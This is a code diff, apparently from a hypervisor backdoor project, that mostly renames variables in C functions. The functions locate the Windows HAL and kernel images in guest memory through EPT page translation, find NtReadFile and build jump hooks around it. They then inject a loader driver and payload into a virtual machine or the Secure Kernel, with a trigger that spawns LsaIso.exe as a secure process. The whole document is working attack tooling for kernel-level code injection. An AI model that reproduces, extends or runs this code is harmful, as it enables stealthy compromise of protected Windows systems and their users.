@@ -253,22 +253,22 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
 
     printf("[+] Locating kernel image in memory...\n");
             
-    uint64_t hal_base_virt = _ALIGN_DOWN(hal_lm_stub, PAGE_SIZE);
-    uint64_t hal_base_phys = 0;
+    uint64_t hal_addr_virt = _ALIGN_DOWN(hal_lm_stub, PAGE_SIZE);
+    uint64_t hal_addr_phys = 0;
     uint32_t hal_size = 0;
 
-    uint64_t nt_base_virt = 0;
-    uint64_t nt_base_phys = 0;
+    uint64_t nt_addr_virt = 0;
+    uint64_t nt_addr_phys = 0;
     uint32_t nt_size = 0;
 
     uint32_t hal_idata_addr = 0;
     uint32_t hal_idata_size = 0;
 
-    while (hal_lm_stub - hal_base_virt < PAGE_SIZE * 0x500)
+    while (hal_lm_stub - hal_addr_virt < PAGE_SIZE * 0x500)
     {
         m_quiet = true;
 
-        if (backdoor_virt_translate(hal_base_virt, &phys_addr, pml4_addr, ept_addr) != 0)
+        if (backdoor_virt_translate(hal_addr_virt, &phys_addr, pml4_addr, ept_addr) != 0)
         {
             m_quiet = false;  
 
@@ -310,7 +310,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
                     if (!strncmp((char *)&sec_curr->Name, "PAGEVRFY", 8))
                     {
                         // HalpLMStub() points to the kernel image!
-                        nt_base_virt = hal_base_virt;
+                        nt_addr_virt = hal_addr_virt;
                         goto _nt_found;
                     }
 
@@ -332,16 +332,16 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
                     sec_curr += 1;
                 }
 
-                hal_base_phys = phys_addr;
+                hal_addr_phys = phys_addr;
                 hal_size = hdr->OptionalHeader.SizeOfImage;
                 break;
             }                
         }            
 
-        hal_base_virt -= PAGE_SIZE;
+        hal_addr_virt -= PAGE_SIZE;
     }
 
-    if (hal_base_phys == 0 || hal_size == 0)
+    if (hal_addr_phys == 0 || hal_size == 0)
     {
         printf("ERROR: Unable to locate HAL image\n");
         goto _end;
@@ -353,7 +353,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
         goto _end;
     }
 
-    printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_base_virt, hal_base_phys);        
+    printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_addr_virt, hal_addr_phys);        
 
     hal_size = _ALIGN_UP(hal_size, PAGE_SIZE);
 
@@ -368,7 +368,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
             {
                 m_quiet = true;
 
-                if (backdoor_virt_translate(hal_base_virt + i, &phys_addr, pml4_addr, ept_addr) != 0)
+                if (backdoor_virt_translate(hal_addr_virt + i, &phys_addr, pml4_addr, ept_addr) != 0)
                 {
                     m_quiet = false;
                     continue;
@@ -398,7 +398,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
             uint64_t *imp_thunk = (uint64_t *)RVATOVA(hal_image, imp->FirstThunk);
                                 
             // get ntoskrnl pointer
-            nt_base_virt = _ALIGN_DOWN(*imp_thunk, PAGE_SIZE);                
+            nt_addr_virt = _ALIGN_DOWN(*imp_thunk, PAGE_SIZE);                
         }
 
         free(hal_image);
@@ -408,7 +408,7 @@ int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *paylo
         goto _end;
     }
 
-    if (nt_base_virt == 0)
+    if (nt_addr_virt == 0)
     {
         printf("ERROR: Unable to locate kernel pointer\n");
         goto _end;
@@ -424,7 +424,7 @@ _nt_found:
     {
         m_quiet = true;
 
-        if (backdoor_virt_translate(nt_base_virt, &phys_addr, pml4_addr, ept_addr) != 0)
+        if (backdoor_virt_translate(nt_addr_virt, &phys_addr, pml4_addr, ept_addr) != 0)
         {
             m_quiet = false;  
 
@@ -474,18 +474,18 @@ _nt_found:
                     sec += 1;
                 }
 
-                nt_base_phys = phys_addr;
+                nt_addr_phys = phys_addr;
                 nt_size = hdr->OptionalHeader.SizeOfImage;
                 nt_sec_align = hdr->OptionalHeader.SectionAlignment;
                 break;
             }
         }            
 
-        nt_base_virt -= PAGE_SIZE;
+        nt_addr_virt -= PAGE_SIZE;
         ptr += PAGE_SIZE;
     }
 
-    if (nt_base_phys == 0 || nt_size == 0)
+    if (nt_addr_phys == 0 || nt_size == 0)
     {
         printf("ERROR: Unable to locate kernel base\n");
         goto _end;
@@ -503,7 +503,7 @@ _nt_found:
         goto _end;
     }
 
-    printf("[+] Kernel is at 0x%llx (physical: 0x%llx)\n", nt_base_virt, nt_base_phys);    
+    printf("[+] Kernel is at 0x%llx (physical: 0x%llx)\n", nt_addr_virt, nt_addr_phys);    
 
     uint32_t nt_text_max_size  = _ALIGN_UP(nt_text_size, nt_sec_align);
     uint64_t nt_func_virt = 0, nt_func_phys = 0;
@@ -530,7 +530,7 @@ _nt_found:
             {
                 m_quiet = true;    
 
-                if (backdoor_virt_translate(nt_base_virt + i, &phys_addr, pml4_addr, ept_addr) != 0)
+                if (backdoor_virt_translate(nt_addr_virt + i, &phys_addr, pml4_addr, ept_addr) != 0)
                 {
                     m_quiet = false;
                     continue;
@@ -549,7 +549,7 @@ _nt_found:
         if ((rva = LdrGetProcAddress(nt_image, "NtReadFile")) != 0)
         {
             // get nt!NtReadFile() virtual address
-            nt_func_virt = nt_base_virt + rva;
+            nt_func_virt = nt_addr_virt + rva;
             m_quiet = true;
 
             // get nt!NtReadFile() physical address
@@ -627,7 +627,7 @@ _nt_found:
     }
 
     uint64_t addr_jump_1_virt = nt_func_virt - JUMP_SIZE_1;
-    uint64_t addr_jump_2_virt = nt_base_virt + nt_text_addr + nt_text_size;
+    uint64_t addr_jump_2_virt = nt_addr_virt + nt_text_addr + nt_text_size;
     uint64_t addr_jump_1_phys = 0, addr_jump_2_phys = 0;
 
     uint8_t buff_jump_1[JUMP_SIZE_1], buff_jump_2[JUMP_SIZE_2];
@@ -711,12 +711,12 @@ _nt_found:
     DRIVER_PARAMS loader_params;
 
     // set up driver parameters
-    loader_params.KernelBase = (void *)nt_base_virt;
-    loader_params.DriverBase = (void *)driver_base_virt;
-    loader_params.PayloadBase = payload_mem;
-    loader_params.PayloadPagesCount = payload_mem_size / PAGE_SIZE;
-    loader_params.PayloadEpt = current_ept_addr;    
-    loader_params.PayloadCr3 = current_pml4_addr;
+    loader_params.kernel_base = (void *)nt_addr_virt;
+    loader_params.driver_base = (void *)driver_base_virt;
+    loader_params.payload_base = payload_mem;
+    loader_params.payload_pages_count = payload_mem_size / PAGE_SIZE;
+    loader_params.payload_ept = current_ept_addr;    
+    loader_params.payload_pml4 = current_pml4_addr;
 
     // copy driver parameters
     memcpy(loader_mem + driver_m_Params, &loader_params, sizeof(loader_params));
@@ -1091,17 +1091,11 @@ int backdoor_vm_exec_find_info(uint64_t ept_addr, uint64_t *proc_pml4_addr, uint
         goto _end;
     }
 
-    if (exec_info.signature == VM_EXEC_INFO_SIGN)
+    if (exec_info.signature == VM_EXEC_INFO_SIGN && exec_info.struct_addr != 0)
     {
         // return VM_EXEC_INFO physical address to the caller
         *proc_pml4_addr = exec_info.page_dir;
-
-        m_quiet = true;
-
-        // get host physical address of VM_EXEC_STRUCT structure
-        backdoor_virt_translate((uint64_t)exec_info.struct_addr, info_addr, exec_info.page_dir, ept_addr);        
-
-        m_quiet = false;
+        *info_addr = exec_info.struct_addr;        
     }
 
 _end:
@@ -1892,24 +1886,22 @@ int backdoor_sk_trigger(void)
     strcat(path, "\\LsaIso.exe");
 
     // create secure process
-    BOOL success = CreateProcess(
+    if (CreateProcess(
         path, NULL, NULL, NULL, FALSE, CREATE_SECURE_PROCESS,
-        NULL, NULL, &startup_info, &process_info
-    );
-    if (success)
+        NULL, NULL, &startup_info, &process_info))
     {
         if (WaitForSingleObject(process_info.hProcess, 1000) == WAIT_TIMEOUT)
         {
             // force process exit
             TerminateProcess(process_info.hProcess, 0);
         }
-        
+
         CloseHandle(process_info.hProcess);
         CloseHandle(process_info.hThread);
 
         return 0;
     }
-    
+
     return -1;
 }
 
@@ -2268,12 +2260,12 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
     DRIVER_SK_PARAMS loader_params;
 
     // set up driver parameters
-    loader_params.KernelBase = (void *)sk_addr_virt;
-    loader_params.DriverBase = (void *)driver_base_virt;
-    loader_params.PayloadBase = payload_mem;
-    loader_params.PayloadPagesCount = payload_mem_size / PAGE_SIZE;
-    loader_params.PayloadEpt = current_ept_addr;    
-    loader_params.PayloadCr3 = current_pml4_addr;
+    loader_params.kernel_base = (void *)sk_addr_virt;
+    loader_params.driver_base = (void *)driver_base_virt;
+    loader_params.payload_base = payload_mem;
+    loader_params.payload_pages_count = payload_mem_size / PAGE_SIZE;
+    loader_params.payload_ept = current_ept_addr;    
+    loader_params.payload_pml4 = current_pml4_addr;
 
     // copy driver parameters
     memcpy(loader_mem + driver_m_Params, &loader_params, sizeof(loader_params));
